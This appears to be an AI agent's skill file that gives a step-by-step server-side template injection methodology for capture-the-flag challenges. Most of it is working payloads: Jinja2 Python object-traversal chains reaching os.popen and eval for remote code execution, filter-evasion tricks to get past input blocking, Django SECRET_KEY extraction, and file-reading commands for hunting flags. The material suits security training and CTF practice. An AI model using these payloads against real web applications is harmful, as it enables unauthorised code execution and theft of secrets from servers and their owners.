---
name: ssti
description: >
  Use when server-side template injection is suspected. Fire when: input echoes
  back with unexpected template-like formatting, the target uses Flask/Jinja2/Django/
  Twig (check response headers, error messages, URL patterns), submitting
  {{7*7}} or similar returns 49 instead of the literal string, error messages
  reference template engines, the challenge mentions SSTI or template injection.
  Also fire when you've confirmed template evaluation and need to escalate to
  RCE via Python object traversal. Do NOT fire for simple echo tests — only when
  template execution is suspected or confirmed.
---

# SSTI (Server-Side Template Injection) Methodology

## Step 1: Confirm template evaluation

Inject a mathematical expression into every input and URL parameter:

```
{{7*7}}
${7*7}
#{7*7}
```

If the response contains `49` instead of the literal string, template evaluation is confirmed. This is your proof of concept.

**Engines by framework**: The syntax and escalation path depend on which template engine is used:
- Flask/Jinja2: `{{7*7}}` — Python object traversal
- Django: `{{7*7}}` but more restricted — context leak, then bypass
- Twig (PHP): `{{7*7}}` — PHP object or direct execution
- ERB (Ruby): `<%= 7*7 %>`
- Thymeleaf (Java): `${7*7}`

Identify the engine from: error messages, response headers (`Server: Werkzeug` → Flask/Jinja2), URL path hints, or which syntax works.

## Step 2: Identify the engine (if not obvious)

Try probe payloads and observe the output:

| Payload | Engine if 49 appears |
|---|---|
| `{{7*'7'}}` → `49` | Jinja2 |
| `{{7*'7'}}` → `7777777` | Twig |
| `{{7*'7'}}` → error | Django or custom |
| `<%= 7*7 %>` → 49 | Ruby ERB |
| `${7*7}` → 49 | FreeMarker/Thymeleaf |

## Step 3: Escalate to RCE (Jinja2/Python — most common)

Once you have Jinja2 evaluation, the path to RCE is through Python's object graph:

### Basic RCE payload:
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### If `config` is not accessible:
```
{{''.__class__.__mro__[1].__subclasses__()}}
```

This returns a list of all subclasses. Scan for:
- `<class 'warnings.catch_warnings'>` → contains `__init__.__globals__['sys'].modules['os']`
- `<class 'subprocess.Popen'>` → direct command execution
- `<class 'os._wrap_close'>` → `popen()` for command execution

### The general principle:
```
''.__class__              → str class
.__mro__[1]               → object (parent of all classes)
.__subclasses__()         → ALL loaded classes in the Python process
```

From any of these subclasses, you can reach `__init__.__globals__` which contains imported modules including `os`, `subprocess`, `sys`.

### Reliable RCE chain:
```
{{''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag*').read()")}}
```

Where `<index>` is the position of a class with access to `__globals__` (try `catch_warnings` at various indices — the exact index varies by environment).

### To find the right index:
1. First dump subclasses: `{{''.__class__.__mro__[1].__subclasses__()}}`
2. Search for `catch_warnings`, `Popen`, `_wrap_close`, or `WarningMessage`
3. Note the index number and use it in the RCE payload

## Step 4: Filter evasion

If your payload is blocked:
- **`__` double underscore filtered**: Use string concatenation `__class__` → `['cla'+'ss']` or `request.args.x` trick
- **Keywords like `popen` blocked**: Use `eval()`, `exec()`, `compile()`, or `getattr`
- **Spaces filtered**: Many engines handle this; use `${x}` syntax or URL-encode
- **`[]` brackets filtered**: Use `|attr('__class__')` pipe filter syntax in Jinja2

## Step 5: Django-specific escalation

Django templates are more restricted by default. The typical path:
1. Confirm `{{7*7}}` works
2. Try to access `{{request}}` for context data leak
3. Use template filter chains or template inheritance to break out of sandbox restrictions
4. If `{{settings.SECRET_KEY}}` works, you may extract configuration secrets directly

## Critical: flag extraction

Once you have RCE, the flag is typically in:
- `/flag`, `/flag.txt`, `.env`, the application config, or the database
- Use `cat /flag*` or find it in the app source: `find / -name "flag*" 2>/dev/null`
- Read the source code if needed: `ls -la /app/` or check the web root
